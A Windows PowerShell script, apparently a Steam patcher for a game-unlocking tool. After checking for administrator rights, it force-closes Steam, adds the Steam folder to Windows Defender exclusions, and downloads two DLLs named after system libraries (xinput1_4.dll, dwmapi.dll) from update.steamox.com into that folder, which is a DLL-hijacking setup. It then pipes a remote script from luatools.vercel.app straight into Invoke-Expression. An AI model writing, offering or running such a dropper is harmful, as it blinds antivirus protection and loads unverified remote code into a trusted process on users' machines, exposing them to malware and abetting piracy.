# ===== ADMIN CHECK =====
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

if (-not $IsAdmin) {
    Write-Host "Not running as admin, Windows Defender changes won't run." -ForegroundColor Yellow
    Write-Host ""
    $choice = Read-Host "Are you sure you want to continue? (Y/N)"

    if ($choice -notin @("Y","y")) {
        Write-Host "Cancelled." -ForegroundColor Red
        Start-Sleep -Seconds 1
        exit
    }

    Write-Host "Continuing..." -ForegroundColor Green
}

# ===== CONFIRM CONTINUE =====

Write-Host "Starting..." -ForegroundColor Cyan

# ===== GET STEAM PATH =====
$steamPath = (Get-ItemProperty "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue).SteamPath
if (-not $steamPath -or -not (Test-Path $steamPath)) {
    Write-Host "Steam not found." -ForegroundColor Red
    exit
}

Write-Host "Steam path: $steamPath"

# ===== CLOSE STEAM =====
Write-Host "Closing Steam..."
while (Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue) {
    Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep 1
}
Write-Host "Steam closed." -ForegroundColor Green

# ===== DEFENDER EXCLUSION =====
if ($IsAdmin -and $env:SKIP_DEFENDER -ne "1") {
    Write-Host "Adding Defender exclusion..."
    try {
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
        Write-Host "Defender updated." -ForegroundColor Green
    } catch {
        Write-Host "Defender change failed." -ForegroundColor Yellow
    }
} else {
    Write-Host "Skipping Defender changes."
}

# ===== DOWNLOAD DLLS =====
Write-Host "Downloading DLLs..."

$urls = @{
    "xinput1_4.dll" = "http://update.steamox.com/update"
    "dwmapi.dll"    = "http://update.steamox.com/dwmapi"
}

foreach ($dll in $urls.Keys) {
    $dest = Join-Path $steamPath $dll
    Write-Host "Getting $dll..."
    try {
        Invoke-RestMethod -Uri $urls[$dll] -OutFile $dest
        Write-Host "$dll done." -ForegroundColor Green
    } catch {
        Write-Host "Failed: $dll" -ForegroundColor Red
    }
}

Write-Host "DLLs finished."

# ===== LUATOOLS (TEMPORARY) FIXER =====
Write-Host "Running Luatools fixer."
try {
    irm "https://luatools.vercel.app/temporary-fixer.ps1" | iex
} catch {
    Write-Host "Fixer failed." -ForegroundColor Yellow
}

# ===== START STEAM =====
Write-Host "Launching Steam..."
Start-Process (Join-Path $steamPath "steam.exe")

Write-Host "Done." -ForegroundColor Cyan

Pause
